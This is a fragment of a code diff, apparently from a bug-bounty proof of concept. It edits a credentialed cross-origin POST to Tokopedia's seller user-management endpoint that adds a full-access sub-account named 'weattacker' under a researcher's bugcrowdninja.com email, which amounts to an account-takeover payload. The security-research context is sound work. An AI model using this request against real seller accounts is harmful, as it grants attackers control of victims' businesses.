@@ -44,7 +44,7 @@
             "x-tt-oec-region": "ID"
           },
           "referrer": "https://seller-id.tokopedia.com/profile/account-setting/user-management?module=add_user",
-          "body": JSON.stringify({global_seller_roles:[{global_seller_id:sellerId,roles:[{identifier:"subaccount_role_full_access"}]}],seller_roles:[],default_language:"en",email:"esperamier+2@bugcrowdninja.com",mobile:"",user_name:"weattacker"}),
+          "body": '{"global_seller_roles":[{"global_seller_id":'+ sellerId +',"roles":[{"identifier":"subaccount_role_full_access"}]}],"seller_roles":[],"default_language":"en","email":"esperamier+2@bugcrowdninja.com","mobile":"","user_name":"weattacker"}',
           "method": "POST",
           "mode": "cors",
           "credentials": "include"
@@ -54,8 +54,7 @@
     }
   
   return {path: path, headers: headers};
-})
-                        })`,
+})`,
                         
                         environment: {
                             type: "PROD-PUBLIC",
